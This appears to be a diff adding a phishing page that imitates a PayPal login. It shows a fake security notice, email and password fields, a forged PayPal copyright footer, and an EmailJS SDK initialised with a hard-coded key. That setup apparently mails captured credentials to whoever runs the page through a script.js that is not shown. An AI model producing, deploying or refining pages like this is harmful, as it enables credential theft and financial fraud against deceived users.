@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPal — Secure Password</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" type="image/png" sizes="180x180" href="paypal.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="paypal.png">
+</head>
+<body>
+  
+  <div class="user-info">
+    <p id="user-location">Location: </p>
+    <p id="user-time">Time: </p>
+  </div>
+  
+  <div class="auth-page">
+    <div class="security-note">
+  🛡️ For your security, we recommend signing in and updating your password to help protect your account.
+    </div>
+    
+    <div class="login-container">
+      <h2>PayPal</h2>
+      <input type="email" id="email" placeholder="Email">
+      <input type="password" id="password" placeholder="Password">
+      
+      <button id="loginBtn">Next</button>
+      
+    </div>
+
+  <div class="footer-text">
+    <span class="shield">🛡️</span>
+    <span class="reassurance-text">
+      Your account is protected by industry-standard security measures.  
+      Reset your password with confidence.
+    </span>
+  </div>
+
+  <!-- ✅ Optional EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <script>
+    (function () {
+      emailjs.init("pEe5qYvqXQKHp5mAh"); // your PUBLIC KEY
+    })();
+  </script>
+
+  <!-- ✅ Your main app logic -->
+  <script src="script.js"></script>
+
+  <!-- Modal -->
+<div id="modal" class="modal hidden">
+  <div class="modal-box">
+    <p id="modalMessage"></p>
+    <button id="modalClose">OK</button>
+  </div>
+</div>
+
+<footer class="footer">
+  <p class="footer-copy">&copy; 1999–2026 PayPal, Inc. All rights reserved.</p>
+  </div>
+</footer>
+  
+  
+</body>
+</html>
